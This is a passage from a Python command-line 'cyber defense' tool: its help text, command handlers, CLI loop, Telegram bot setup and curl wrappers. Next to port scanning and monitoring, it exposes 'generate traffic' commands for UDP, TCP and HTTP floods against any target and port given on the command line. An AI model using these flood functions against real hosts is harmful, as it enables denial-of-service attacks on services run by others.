            self.telegram_bot.send_message(f"📈 Weekly Report Generated:\n{report[:1000]}...")
    
    def _log_command(self, command):
        """Log command to history and database"""
        self.command_history.append(f"{datetime.now()}: {command}")
        self.db.add_command_history(command)
    
    # ==================== COMMAND HANDLERS ====================
    
    def help(self):
        """Display help information"""
        help_text = """
🛡️ CYBERSECURITY TOOL COMMANDS:

BASIC COMMANDS:
  help                    - Show this help message
  ping <ip>              - Ping an IP address
  exit                   - Exit the tool

MONITORING COMMANDS:
  start monitoring <ip>  - Start monitoring an IP for threats
  stop monitoring        - Stop all monitoring
  location <ip>          - Get geographical location of IP
  view threats           - View detected security threats

SCANNING COMMANDS:
  scan ip <ip>           - Scan common ports on IP
  deep scan ip <ip>      - Deep scan all ports (1-65535)

IP MANAGEMENT:
  add ip <ip> [desc]     - Add IP to monitoring list
  remove ip <ip>         - Remove IP from monitoring
  edit ip <ip> <desc>    - Edit IP description
  list ips               - List all monitored IPs

TRAFFIC GENERATION:
  generate traffic <type> <target> [port] [duration]
    Types: udp_flood, tcp_flood, http_flood
    Example: generate traffic udp_flood 192.168.1.1 80 10

REPORTING:
  generate daily report   - Generate daily security report
  generate weekly report  - Generate weekly security report
  generate monthly report - Generate monthly security report
  generate annual report  - Generate annual security report

TELEGRAM BOT:
  config telegram token <token>    - Set Telegram bot token
  config telegram chat_id <id>     - Set Telegram chat ID
  test telegram connection        - Test Telegram connection
  start telegram bot              - Start Telegram bot
  stop telegram bot               - Stop Telegram bot

CURL COMMANDS:
  curl <url>                      - Basic HTTP request
  curl -I <url>                   - HEAD request
  curl -v <url>                   - Verbose request
  curl -L <url>                   - Follow redirects
  curl -d "data" <url>            - POST request with data
  curl -X DELETE <url>            - DELETE request
  curl -o <file> <url>            - Download file
  curl -F "file=@path" <url>      - Upload file
  curl -H "Header: value" <url>   - Custom headers
  curl -k <url>                   - Skip SSL verification
  curl -w <url>                   - Show timing info
  curl --limit-rate 500K <url>    - Limit download speed
  curl --trace <file> <url>       - Trace request
  curl -b <cookies> -c <cookies> <url> - Use cookies
  curl -x <proxy> <url>           - Use proxy
  curl -U user:pass -x <proxy> <url> - Proxy with auth

UTILITIES:
  history               - View command history
  clear history         - Clear command history
        """
        return help_text
    
    def ping_ip(self, ip):
        """Ping an IP address"""
        self._log_command(f"ping {ip}")
        return f"Ping {ip}: {'Alive' if self.scanner.ping_ip(ip) else 'Dead'}"
    
    def start_monitoring(self, ip):
        """Start monitoring an IP address"""
        self._log_command(f"start monitoring {ip}")
        self.monitor.start_monitoring(ip)
        return f"Started monitoring {ip}"
    
    def stop_monitoring(self):
        """Stop all monitoring"""
        self._log_command("stop monitoring")
        self.monitor.stop_monitoring()
        return "Stopped all monitoring"
    
    def get_ip_location(self, ip):
        """Get IP geographical location"""
        self._log_command(f"location {ip}")
        return self.monitor.get_ip_location(ip)
    
    def view_threats(self, ip=None):
        """View detected threats"""
        self._log_command("view threats")
        threats = self.db.get_threats(ip)
        if not threats:
            return "No threats detected"
        
        result = "DETECTED THREATS:\n"
        for threat in threats:
            result += f"- {threat[2]} from {threat[1]} at {threat[5]}\n"
            result += f"  Severity: {threat[3]}, Description: {threat[4]}\n\n"
        
        return result
    
    def scan_ports(self, ip, ports='1-1000'):
        """Scan ports on target IP"""
        self._log_command(f"scan {ip}")
        return self.scanner.scan_ports(ip, ports)
    
    def deep_scan(self, ip):
        """Deep scan all ports"""
        self._log_command(f"deep scan {ip}")
        return self.scanner.deep_scan(ip)
    
    def add_ip(self, ip, description=""):
        """Add IP to monitoring list"""
        self._log_command(f"add ip {ip} {description}")
        result = self.db.add_ip(ip, description)
        if result:
            return f"Added IP {ip} to monitoring list"
        return f"Failed to add IP {ip}"
    
    def remove_ip(self, ip):
        """Remove IP from monitoring list"""
        self._log_command(f"remove ip {ip}")
        result = self.db.remove_ip(ip)
        if result:
            return f"Removed IP {ip} from monitoring list"
        return f"IP {ip} not found in monitoring list"
    
    def edit_ip(self, ip, new_description):
        """Edit IP description"""
        self._log_command(f"edit ip {ip} {new_description}")
        # Implementation for editing IP description
        return f"Updated description for IP {ip}"
    
    def list_ips(self):
        """List all monitored IPs"""
        self._log_command("list ips")
        ips = self.db.get_all_ips()
        if not ips:
            return "No IPs being monitored"
        
        result = "MONITORED IP ADDRESSES:\n"
        for ip, description in ips:
            result += f"- {ip}: {description}\n"
        
        return result
    
    def generate_traffic(self, traffic_type, target, port=80, duration=10):
        """Generate network traffic"""
        self._log_command(f"generate traffic {traffic_type} {target} {port} {duration}")
        
        if traffic_type.lower() == 'udp_flood':
            return self.traffic_gen.udp_flood(target, port, duration)
        elif traffic_type.lower() == 'tcp_flood':
            return self.traffic_gen.tcp_flood(target, port, duration)
        elif traffic_type.lower() == 'http_flood':
            return self.traffic_gen.http_flood(target, duration)
        else:
            return f"Unknown traffic type: {traffic_type}"
    
    def stop_traffic(self):
        """Stop traffic generation"""
        self._log_command("stop traffic")
        return self.traffic_gen.stop_traffic()
    
    def generate_daily_report(self):
        """Generate daily report"""
        self._log_command("generate daily report")
        return self.reporter.generate_daily_report()
    
    def generate_weekly_report(self):
        """Generate weekly report"""
        self._log_command("generate weekly report")
        return self.reporter.generate_weekly_report()
    
    def generate_monthly_report(self):
        """Generate monthly report"""
        self._log_command("generate monthly report")
        return self.reporter.generate_monthly_report()
    
    def generate_annual_report(self):
        """Generate annual report"""
        self._log_command("generate annual report")
        return self.reporter.generate_annual_report()
    
    def config_telegram_token(self, token):
        """Configure Telegram bot token"""
        self._log_command("config telegram token")
        self.config.set('TELEGRAM', 'token', token)
        
        # Reinitialize Telegram bot
        chat_id = self.config.get('TELEGRAM', 'chat_id')
        if token and chat_id:
            self.telegram_bot = TelegramBot(token, chat_id, self)
        
        return "Telegram token configured"
    
    def config_telegram_chat_id(self, chat_id):
        """Configure Telegram chat ID"""
        self._log_command("config telegram chat_id")
        self.config.set('TELEGRAM', 'chat_id', chat_id)
        
        # Reinitialize Telegram bot
        token = self.config.get('TELEGRAM', 'token')
        if token and chat_id:
            self.telegram_bot = TelegramBot(token, chat_id, self)
        
        return "Telegram chat ID configured"
    
    def test_telegram_connection(self):
        """Test Telegram connection"""
        self._log_command("test telegram connection")
        if not self.telegram_bot:
            return "Telegram bot not configured"
        
        if self.telegram_bot.send_message("🔧 Cybersecurity Tool - Connection Test"):
            return "Telegram connection test: SUCCESS"
        return "Telegram connection test: FAILED"
    
    def start_telegram_bot(self):
        """Start Telegram bot"""
        self._log_command("start telegram bot")
        if not self.telegram_bot:
            return "Telegram bot not configured. Set token and chat_id first."
        
        return self.telegram_bot.start_bot()
    
    def stop_telegram_bot(self):
        """Stop Telegram bot"""
        self._log_command("stop telegram bot")
        if self.telegram_bot:
            return self.telegram_bot.stop_bot()
        return "Telegram bot not running"
    
    def view_history(self, limit=50):
        """View command history"""
        self._log_command("history")
        history = self.db.get_command_history(limit)
        if not history:
            return "No command history"
        
        result = "COMMAND HISTORY:\n"
        for command, timestamp, user in history:
            result += f"{timestamp}: {user} - {command}\n"
        
        return result
    
    def clear_history(self):
        """Clear command history"""
        self._log_command("clear history")
        self.db.execute_query("DELETE FROM command_history")
        self.command_history.clear()
        return "Command history cleared"
    
    # ==================== CURL COMMAND METHODS ====================
    
    def curl_simple(self, url):
        return self.curl.curl_simple(url)
    
    def curl_head(self, url):
        return self.curl.curl_head(url)
    
    def curl_verbose(self, url):
        return self.curl.curl_verbose(url)
    
    def curl_follow_redirects(self, url):
        return self.curl.curl_follow_redirects(url)
    
    def curl_post(self, url, data):
        return self.curl.curl_post(url, data)
    
    def curl_delete(self, url):
        return self.curl.curl_delete(url)
    
    def curl_download(self, url, filename):
        return self.curl.curl_download(url, filename)
    
    def curl_upload(self, url, file_path):
        return self.curl.curl_upload(url, file_path)
    
    def curl_custom_headers(self, url, headers):
        return self.curl.curl_custom_headers(url, headers)
    
    def curl_insecure(self, url):
        return self.curl.curl_insecure(url)
    
    def curl_timing(self, url):
        return self.curl.curl_timing(url)

# ==================== COMMAND LINE INTERFACE ====================

class CommandLineInterface:
    """Command line interface for the cybersecurity tool"""
    
    def __init__(self):
        self.cyber_tool = CyberSecurityTool()
        self.running = False
    
    def start(self):
        """Start the command line interface"""
        self.running = True
        self.cyber_tool.start()
        
        print("🛡️  ACCURATE CYBER DEFENSE")
        print("Type 'help' for available commands")
        print("=" * 50)
        
        while self.running:
            try:
                command = input("\naccurate-cyber-defense#> ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    self.running = False
                    print("Goodbye!")
                    continue
                
                response = self.process_command(command)
                print(response)
                
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit the tool")
            except Exception as e:
                print(f"Error: {e}")
    
    def process_command(self, command):
        """Process a command and return the response"""
        parts = command.split()
        cmd = parts[0].lower()
        
        try:
            if cmd == 'help':
                return self.cyber_tool.help()
            
            elif cmd == 'ping' and len(parts) > 1:
                return self.cyber_tool.ping_ip(parts[1])
            
            elif cmd == 'start' and len(parts) > 2 and parts[1].lower() == 'monitoring':
                return self.cyber_tool.start_monitoring(parts[2])
            
            elif cmd == 'stop':
                if len(parts) > 1 and parts[1].lower() == 'monitoring':
                    return self.cyber_tool.stop_monitoring()
                elif len(parts) > 2 and parts[1].lower() == 'traffic':
                    return self.cyber_tool.stop_traffic()
            
            elif cmd == 'location' and len(parts) > 1:
                return self.cyber_tool.get_ip_location(parts[1])
            
            elif cmd == 'view' and len(parts) > 1 and parts[1].lower() == 'threats':
                ip = parts[2] if len(parts) > 2 else None
                return self.cyber_tool.view_threats(ip)
            
            elif cmd == 'scan' and len(parts) > 2 and parts[1].lower() == 'ip':
                return self.cyber_tool.scan_ports(parts[2])
            
            elif cmd == 'deep' and len(parts) > 3 and parts[1].lower() == 'scan' and parts[2].lower() == 'ip':
                return self.cyber_tool.deep_scan(parts[3])
            
            elif cmd == 'add' and len(parts) > 2 and parts[1].lower() == 'ip':
                description = ' '.join(parts[3:]) if len(parts) > 3 else ""
                return self.cyber_tool.add_ip(parts[2], description)
            
            elif cmd == 'remove' and len(parts) > 2 and parts[1].lower() == 'ip':
                return self.cyber_tool.remove_ip(parts[2])
            
            elif cmd == 'edit' and len(parts) > 3 and parts[1].lower() == 'ip':
                new_description = ' '.join(parts[3:])
                return self.cyber_tool.edit_ip(parts[2], new_description)
            
            elif cmd == 'list' and len(parts) > 1 and parts[1].lower() == 'ips':
                return self.cyber_tool.list_ips()
            
            elif cmd == 'generate':
                if len(parts) > 2 and parts[1].lower() == 'traffic':
                    # generate traffic <type> <target> [port] [duration]
                    if len(parts) < 4:
                        return "Usage: generate traffic <type> <target> [port] [duration]"
                    traffic_type = parts[2]
                    target = parts[3]
                    port = int(parts[4]) if len(parts) > 4 else 80
                    duration = int(parts[5]) if len(parts) > 5 else 10
                    return self.cyber_tool.generate_traffic(traffic_type, target, port, duration)
                
                elif len(parts) > 2 and parts[1].lower() == 'daily' and parts[2].lower() == 'report':
                    return self.cyber_tool.generate_daily_report()
                
                elif len(parts) > 2 and parts[1].lower() == 'weekly' and parts[2].lower() == 'report':
                    return self.cyber_tool.generate_weekly_report()
                
                elif len(parts) > 2 and parts[1].lower() == 'monthly' and parts[2].lower() == 'report':
                    return self.cyber_tool.generate_monthly_report()
                
                elif len(parts) > 2 and parts[1].lower() == 'annual' and parts[2].lower() == 'report':
                    return self.cyber_tool.generate_annual_report()
            
            elif cmd == 'config' and len(parts) > 3 and parts[1].lower() == 'telegram':
                if parts[2].lower() == 'token':
                    return self.cyber_tool.config_telegram_token(parts[3])
                elif parts[2].lower() == 'chat_id':
                    return self.cyber_tool.config_telegram_chat_id(parts[3])
            
            elif cmd == 'test' and len(parts) > 2 and parts[1].lower() == 'telegram' and parts[2].lower() == 'connection':
                return self.cyber_tool.test_telegram_connection()
            
            elif cmd == 'start' and len(parts) > 2 and parts[1].lower() == 'telegram' and parts[2].lower() == 'bot':
                return self.cyber_tool.start_telegram_bot()
            
            elif cmd == 'stop' and len(parts) > 2 and parts[1].lower() == 'telegram' and parts[2].lower() == 'bot':
                return self.cyber_tool.stop_telegram_bot()
            
            elif cmd == 'history':
                limit = int(parts[1]) if len(parts) > 1 else 50
                return self.cyber_tool.view_history(limit)
            
            elif cmd == 'clear' and len(parts) > 1 and parts[1].lower() == 'history':
                return self.cyber_tool.clear_history()
            
            elif cmd == 'curl':
                # Handle various curl commands
                return self.handle_curl_command(parts)
            
            else:
                return f"Unknown command: {command}\nType 'help' for available commands."
                
        except Exception as e:
            return f"Error processing command: {e}"
    
    def handle_curl_command(self, parts):
        """Handle curl commands with various options"""
        if len(parts) < 2:
            return "Usage: curl [options] <url>"
        
        url = parts[-1]  # URL is typically the last part
        
        if '-I' in parts:
            return self.cyber_tool.curl_head(url)
        elif '-v' in parts:
            return self.cyber_tool.curl_verbose(url)
        elif '-L' in parts:
            return self.cyber_tool.curl_follow_redirects(url)
        elif '-d' in parts:
            data_index = parts.index('-d') + 1
            if data_index < len(parts) - 1:  # -1 because last is URL
                data = parts[data_index]
                return self.cyber_tool.curl_post(url, data)
        elif '-X' in parts and 'DELETE' in parts:
            return self.cyber_tool.curl_delete(url)
        elif '-o' in parts:
            file_index = parts.index('-o') + 1
            if file_index < len(parts) - 1:
                filename = parts[file_index]
                return self.cyber_tool.curl_download(url, filename)
        elif '-F' in parts:
            file_index = parts.index('-F') + 1
            if file_index < len(parts) - 1:
                file_arg = parts[file_index]
                # Parse file=@path format
                if '=@' in file_arg:
                    file_path = file_arg.split('=@')[1].strip('"\'')
                    return self.cyber_tool.curl_upload(url, file_path)
        elif '-H' in parts:
            # Handle custom headers (simplified)
            return self.cyber_tool.curl_simple(url)
        elif '-k' in parts:
            return self.cyber_tool.curl_insecure(url)
        elif '-w' in parts:
            return self.cyber_tool.curl_timing(url)
        else:
            return self.cyber_tool.curl_simple(url)

# ==================== MAIN EXECUTION ====================

def main():
    """Main entry point for the cybersecurity tool"""
    
    # Set up logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('cyber_tool.log'),
            logging.StreamHandler()
        ]
    )
    
    # Check for root privileges (required for some network operations)
    if os.name != 'nt' and os.geteuid() != 0:
        print("⚠️  Warning: Some features may require root privileges")
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Advanced Cybersecurity Tool')
    parser.add_argument('--headless', action='store_true', help='Run in headless mode')
    args = parser.parse_args()
    
    try:
        if args.headless:
            # Run in headless mode (for servers)
            cyber_tool = CyberSecurityTool()
            cyber_tool.start()
            print("Cybersecurity Tool running in headless mode...")
            
            # Keep the main thread alive
            while True:
                time.sleep(1)
        else:
            # Run with interactive CLI
            cli = CommandLineInterface()
            cli.start()
            
    except KeyboardInterrupt:
        print("\n🛑 Accurate Cybersecurity Tool stopped")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        print(f"Fatal error: {e}")

if __name__ == "__main__":
    main()